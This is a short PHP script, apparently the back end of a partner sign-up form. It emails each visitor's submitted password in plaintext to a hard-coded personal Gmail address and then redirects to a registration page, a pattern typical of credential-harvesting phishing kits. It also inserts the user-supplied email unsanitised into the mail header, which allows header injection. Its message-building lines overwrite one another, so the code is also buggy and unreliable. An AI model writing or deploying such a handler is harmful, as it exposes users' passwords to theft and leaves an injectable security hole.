<?php 
$ToEmail = 'mohammadrafii480@gmail.com'; 
$EmailSubject = 'Mitra Baru Jaskut'; 
$mailheader = "From: ".$_POST["email"]."\r\n";; 

$MESSAGE_BODY = "Nama  : ".$_POST["name"]."\n\n";
$MESSAGE_BODY = "Email : ".$_POST["email"]."\n\n"; 
$MESSAGE_BODY = "Password : ".$_POST["password"].""; 

mail($ToEmail, $EmailSubject, $MESSAGE_BODY, $mailheader) or die ("Failure"); 

header('location: daftar.php'); 

?>